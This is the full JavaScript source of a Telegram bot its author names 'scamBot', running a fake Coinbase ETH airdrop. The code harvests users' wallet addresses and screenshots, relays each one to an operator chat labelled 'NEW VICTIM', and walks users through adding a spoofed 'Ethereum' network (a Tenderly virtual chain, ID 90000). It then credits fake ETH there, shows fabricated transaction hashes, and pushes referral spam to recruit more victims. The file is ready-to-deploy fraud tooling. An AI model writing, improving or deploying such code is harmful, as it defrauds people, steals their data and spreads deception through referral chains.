require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const axios = require('axios');

// === CONFIG ===
const SCAM_BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_BOT_TOKEN = process.env.ADMIN_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const TENDERLY_RPC = process.env.TENDERLY_RPC;

// === BOTS ===
const scamBot = new Telegraf(SCAM_BOT_TOKEN);
const adminBot = new Telegraf(ADMIN_BOT_TOKEN);

// === IN-MEMORY DB ===
let usersDB = {};
const getUser = (id) => usersDB[id] || null;
const saveUser = (user) => { usersDB[user.telegramId] = user; return user; };
const updateUser = (id, updates) => {
  if (usersDB[id]) Object.assign(usersDB[id], updates);
  return usersDB[id];
};
const getUserByCode = (code) => Object.values(usersDB).find(u => u.referralCode === code);

// === ESCAPE LINK (NOW HTTPS + CLICKABLE) ===
const escapeLink = (code) => `https://t.me/coinbase_eth_airdrop_bot?start=ref_${code}`;

// === RPC GUIDE ===
const RPC_GUIDE = `
Add this network to Coinbase Wallet:

<b>Network Name:</b> Ethereum
<b>RPC URL:</b> https://virtual.mainnet.eu.rpc.tenderly.co/4044dd2f-00ef-4abb-95ab-68ef8a62d13d
<b>Chain ID:</b> 90000
<b>Currency:</b> ETH
`.trim();

// === SEND TO ADMIN (HTML) ===
const sendToAdmin = async (text, photoFileId = null, postLink = null) => {
  try {
    let caption = text;
    if (postLink) caption += `\nPost: ${postLink}`;

    if (photoFileId) {
      const file = await scamBot.telegram.getFile(photoFileId);
      const fileUrl = `https://api.telegram.org/file/bot${SCAM_BOT_TOKEN}/${file.file_path}`;
      const response = await axios.get(fileUrl, { responseType: 'arraybuffer' });
      const buffer = Buffer.from(response.data);
      await adminBot.telegram.sendPhoto(ADMIN_CHAT_ID, { source: buffer }, { 
        caption, 
        parse_mode: 'HTML',
        disable_web_page_preview: true 
      });
    } else {
      await adminBot.telegram.sendMessage(ADMIN_CHAT_ID, caption, { 
        parse_mode: 'HTML',
        disable_web_page_preview: true 
      });
    }
    console.log('ADMIN NOTIFIED');
  } catch (err) {
    console.error('ADMIN SEND FAILED:', err.message);
    try {
      await adminBot.telegram.sendMessage(ADMIN_CHAT_ID, `<b>ADMIN SEND ERROR</b>\n<code>${err.message}</code>`, { parse_mode: 'HTML' });
    } catch {}
  }
};

// === FAKE ETH SEND ===
const sendFakeETH = async (to, eth) => {
  if (!to || to.startsWith('0xFAKE')) return;
  const wei = (eth * 1e18).toString(16);
  try {
    await axios.post(TENDERLY_RPC, {
      jsonrpc: "2.0", method: "eth_sendTransaction",
      params: [{ from: "0x0000000000000000000000000000000000000001", to, value: `0x${wei}` }], id: Date.now()
    });
  } catch {}
};

// === MENU AFTER CLAIM ===
const menuKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback('Profile', 'menu_profile')],
  [Markup.button.callback('Referral Link', 'menu_referral')],
  [Markup.button.callback('Bonus', 'menu_bonus')],
  [Markup.button.callback('Leaderboard', 'menu_leaderboard')]
]);

// === REUSABLE MESSAGES (HTML) ===
const generateProfile = async (id) => {
  const user = getUser(id);
  return `<b>PROFILE</b>\n\n` +
    `User: @${user.username}\n` +
    `Wallet: <code>${user.wallet}</code>\n` +
    `Earned: $${user.totalEarned}\n` +
    `Referrals: ${user.referrals.length}\n` +
    `Link: <a href="${escapeLink(user.referralCode)}">Join Airdrop</a>`;
};

const generateReferral = async (id) => {
  const user = getUser(id);
  return `<b>REFERRAL LINK</b>\n\nEarn $10 per referral:\n` +
    `<a href="${escapeLink(user.referralCode)}">t.me/coinbase_eth_airdrop_bot?start=ref_${user.referralCode}</a>\n\n` +
    `You have ${user.referrals.length} referrals.`;
};

const generateBonus = async (id) => {
  const user = getUser(id);
  const bonus = user.referrals.length * 10;
  return `<b>YOUR BONUS</b>\n\n` +
    `Referrals: ${user.referrals.length}\n` +
    `Total: $${bonus}\n\n` +
    `Click to withdraw:`;
};

const generateLeaderboard = async () => {
  const top = Object.values(usersDB).sort((a, b) => b.totalEarned - a.totalEarned).slice(0, 10);
  let text = `<b>LEADERBOARD</b>\n\n`;
  if (top.length === 0) text += 'No entries yet.';
  top.forEach((u, i) => text += `${i + 1}. @${u.username} — $${u.totalEarned} (${u.referrals.length} refs)\n`);
  return text;
};

// === COMMANDS (HTML) ===
scamBot.command('profile', async (ctx) => {
  const user = getUser(ctx.from.id);
  if (!user) return ctx.reply('Use /start first.');
  ctx.reply(await generateProfile(ctx.from.id), { parse_mode: 'HTML' });
});

scamBot.command('referral', async (ctx) => {
  const user = getUser(ctx.from.id);
  if (!user) return ctx.reply('Use /start first.');
  ctx.reply(await generateReferral(ctx.from.id), { parse_mode: 'HTML' });
});

scamBot.command('bonus', async (ctx) => {
  const user = getUser(ctx.from.id);
  if (!user) return ctx.reply('Use /start.');
  ctx.reply(await generateBonus(ctx.from.id), {
    parse_mode: 'HTML',
    reply_markup: { inline_keyboard: [[{ text: 'WITHDRAW BONUS', callback_data: 'withdraw_bonus' }]] }
  });
});

scamBot.command('leaderboard', async (ctx) => {
  ctx.reply(await generateLeaderboard(), { parse_mode: 'HTML' });
});

// === /start — SMART MENU OR FLOW ===
scamBot.start(async (ctx) => {
  let user = getUser(ctx.from.id);
  const refCode = ctx.startPayload?.startsWith('ref_') ? ctx.startPayload.slice(4) : null;

  if (!user) {
    const code = Math.random().toString(36).substr(2, 8).toUpperCase();
    user = {
      telegramId: ctx.from.id,
      username: ctx.from.username || 'NoUsername',
      referralCode: code,
      referredBy: refCode,
      stage: 'wallet_input',
      wallet: null,
      referrals: [],
      totalEarned: 0,
      claimed50: false,
      twitterPostLink: null
    };
    saveUser(user);

    if (refCode) {
      const referrer = getUserByCode(refCode);
      if (referrer && referrer.telegramId !== ctx.from.id) {
        referrer.referrals.push(ctx.from.id);
        referrer.totalEarned += 10;
        updateUser(referrer.telegramId, referrer);
        await sendFakeETH(referrer.wallet || '0xFAKE', 0.004);
        scamBot.telegram.sendMessage(referrer.telegramId,
          `<b>+1 Referral!</b> $10 sent.\nTotal: $${referrer.totalEarned}\n` +
          `Link: <a href="${escapeLink(referrer.referralCode)}">Join</a>`,
          { parse_mode: 'HTML' }
        );
      }
    }

    await sendToAdmin(`<b>NEW VICTIM</b>\nUser: @${user.username}\nID: <code>${user.telegramId}</code>\nRef: <code>${code}</code>`);
    ctx.reply(`Send your <b>Coinbase wallet address</b> (text) + <b>screenshot</b> (photo).`, 
      { ...Markup.inlineKeyboard([[Markup.button.callback('Send Wallet + SS', 'send_wallet')]]), parse_mode: 'HTML' }
    );
  } else if (user.claimed50) {
    ctx.reply(`<b>Welcome back, @${user.username}!</b>\nYou claimed $50 ETH.`, { ...menuKeyboard, parse_mode: 'HTML' });
  } else {
    ctx.reply(`Continue your airdrop:\nStage: ${user.stage}`, 
      { ...Markup.inlineKeyboard([[Markup.button.callback('Resume', 'send_wallet')]]), parse_mode: 'HTML' }
    );
  }
});

// === TEXT + PHOTO HANDLER ===
scamBot.on('text', async (ctx) => {
  const user = getUser(ctx.from.id);
  if (!user || user.stage !== 'wallet_input') return;

  const wallet = ctx.message.text.trim();
  if (!/^0x[a-fA-F0-9]{40}$/.test(wallet)) {
    return ctx.reply(`Invalid wallet. Send valid 0x... address.`, { parse_mode: 'HTML' });
  }

  user.wallet = wallet;
  user.stage = 'rpc_guide';
  saveUser(user);

  await sendToAdmin(`<b>WALLET INPUT</b>\nUser: @${user.username}\nWallet: <code>${wallet}</code>`);
  ctx.reply(RPC_GUIDE, { ...Markup.inlineKeyboard([[Markup.button.callback('I Added Network', 'rpc_done')]]), parse_mode: 'HTML' });
});

scamBot.on('photo', async (ctx) => {
  const user = getUser(ctx.from.id);
  if (!user) return ctx.reply('Use /start.', { parse_mode: 'HTML' });

  const fileId = ctx.message.photo[ctx.message.photo.length - 1].file_id;

  if (user.stage === 'wallet_input') {
    const wallet = ctx.message.caption?.trim();
    if (wallet && /^0x[a-fA-F0-9]{40}$/.test(wallet)) {
      user.wallet = wallet;
      user.stage = 'rpc_guide';
      saveUser(user);
      await sendToAdmin(`<b>WALLET + SS</b>\nUser: @${user.username}\nWallet: <code>${wallet}</code>`, fileId);
      ctx.reply(RPC_GUIDE, { ...Markup.inlineKeyboard([[Markup.button.callback('I Added Network', 'rpc_done')]]), parse_mode: 'HTML' });
    } else {
      ctx.reply(`Send wallet address in <b>caption</b>.`, { parse_mode: 'HTML' });
    }
    return;
  }

  if (user.stage === 'rpc_proof') {
    user.stage = 'twitter_tasks';
    saveUser(user);
    await sendToAdmin(`<b>RPC PROOF</b>\nUser: @${user.username}\nWallet: <code>${user.wallet}</code>`, fileId);
    ctx.reply(
      `<b>Twitter Task:</b>\n1. Follow @BjExchange53077\n2. Like pinned\n3. <b>Quote</b> it\n4. Tag 3 friends\n5. Send <b>post link</b> + screenshot`,
      { ...Markup.inlineKeyboard([[Markup.button.callback('Send Twitter Proof', 'send_twitter_proof')]]), parse_mode: 'HTML' }
    );
    return;
  }

  if (user.stage === 'twitter_proof') {
    const postLink = ctx.message.caption?.match(/https?:\/\/[^\s]+/)?.[0] || 'No link';
    user.twitterPostLink = postLink;
    user.stage = 'claim_ready';
    saveUser(user);

    await sendToAdmin(`<b>TWITTER PROOF</b>\nUser: @${user.username}\nWallet: <code>${user.wallet}</code>\nPost: ${postLink}`, fileId);
    ctx.reply(`<b>Tasks verified!</b> Claim $50 ETH:`, 
      { ...Markup.inlineKeyboard([[Markup.button.callback('CLAIM $50 ETH', 'claim_eth')]]), parse_mode: 'HTML' }
    );
    return;
  }
});

// === BUTTONS ===
scamBot.action('send_wallet', (ctx) => {
  const user = getUser(ctx.from.id);
  if (!user) return;
  user.stage = 'wallet_input';
  saveUser(user);
  ctx.editMessageText(`Send wallet address (text/caption) + screenshot.`, { parse_mode: 'HTML' });
});

scamBot.action('rpc_done', (ctx) => {
  const user = getUser(ctx.from.id);
  if (!user || user.stage !== 'rpc_guide') return;
  user.stage = 'rpc_proof';
  saveUser(user);
  ctx.editMessageText(`Send Chain ID 90000 proof.`, 
    { ...Markup.inlineKeyboard([[Markup.button.callback('Send RPC Proof', 'send_rpc_proof')]]), parse_mode: 'HTML' }
  );
});

scamBot.action('send_rpc_proof', (ctx) => {
  const user = getUser(ctx.from.id);
  if (!user || user.stage !== 'rpc_proof') return;
  ctx.editMessageText(`Send proof now.`, { parse_mode: 'HTML' });
});

scamBot.action('send_twitter_proof', (ctx) => {
  const user = getUser(ctx.from.id);
  if (!user || user.stage !== 'twitter_tasks') return;
  user.stage = 'twitter_proof';
  saveUser(user);
  ctx.editMessageText(`Send <b>screenshot + post link in caption</b>.`, { parse_mode: 'HTML' });
});

// === CLAIM ONCE ONLY ===
scamBot.action('claim_eth', async (ctx) => {
  const user = getUser(ctx.from.id);
  if (!user || user.stage !== 'claim_ready') {
    await ctx.answerCbQuery('Not ready.');
    return;
  }

  if (user.claimed50) {
    await ctx.answerCbQuery('Already claimed $50!');
    return;
  }

  user.claimed50 = true;
  user.stage = 'claimed';
  saveUser(user);
  await sendFakeETH(user.wallet, 0.02);

  const txHash = "0xFAKE" + Math.random().toString(16).substr(2, 64);
  const claimMsg = 
    `<b>CLAIMED!</b> $50 ETH sent to:\n<code>${user.wallet}</code>\n\n` +
    `Tx: <a href="https://dashboard.tenderly.co/tx/mainnet/${txHash}">View on Tenderly</a>\n\n` +
    `<b>Share:</b> <a href="${escapeLink(user.referralCode)}">Join Airdrop</a>`;

  await ctx.telegram.sendMessage(ctx.from.id, claimMsg, { parse_mode: 'HTML' });
  await ctx.answerCbQuery('Claimed!');

  await sendToAdmin(
    `<b>CLAIMED $50 ETH</b>\nUser: @${user.username}\nWallet: <code>${user.wallet}</code>\nTx: <code>${txHash}</code>`
  );

  ctx.reply(`<b>Welcome to your dashboard!</b>`, { ...menuKeyboard, parse_mode: 'HTML' });
});

// === MENU ACTIONS (HTML) ===
scamBot.action('menu_profile', async (ctx) => {
  await ctx.answerCbQuery();
  ctx.reply(await generateProfile(ctx.from.id), { parse_mode: 'HTML' });
});

scamBot.action('menu_referral', async (ctx) => {
  await ctx.answerCbQuery();
  ctx.reply(await generateReferral(ctx.from.id), { parse_mode: 'HTML' });
});

scamBot.action('menu_bonus', async (ctx) => {
  await ctx.answerCbQuery();
  ctx.reply(await generateBonus(ctx.from.id), {
    parse_mode: 'HTML',
    reply_markup: { inline_keyboard: [[{ text: 'WITHDRAW BONUS', callback_data: 'withdraw_bonus' }]] }
  });
});

scamBot.action('menu_leaderboard', async (ctx) => {
  await ctx.answerCbQuery();
  ctx.reply(await generateLeaderboard(), { parse_mode: 'HTML' });
});

scamBot.action('withdraw_bonus', async (ctx) => {
  const user = getUser(ctx.from.id);
  const bonus = user.referrals.length * 10;
  if (bonus === 0) return ctx.answerCbQuery('No bonus.');

  await sendFakeETH(user.wallet, bonus / 250);
  await ctx.answerCbQuery(`$${bonus} sent!`);
  await ctx.editMessageText(
    `<b>BONUS WITHDRAWN</b>\n$${bonus} sent to <code>${user.wallet}</code>`,
    { parse_mode: 'HTML' }
  );
  await sendToAdmin(`<b>BONUS WITHDRAWN</b>\nUser: @${user.username}\nAmount: $${bonus}\nWallet: <code>${user.wallet}</code>`);
});

// === SERVER ===
scamBot.catch((err, ctx) => console.error('ERROR:', err));

const app = express();
app.use(express.json());
app.use(scamBot.webhookCallback(`/bot${SCAM_BOT_TOKEN}`));

const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
  console.log(`Bot LIVE on ${PORT}`);
  await scamBot.telegram.setWebhook(`${process.env.RENDER_EXTERNAL_URL}/bot${SCAM_BOT_TOKEN}`);
  adminBot.launch();
});
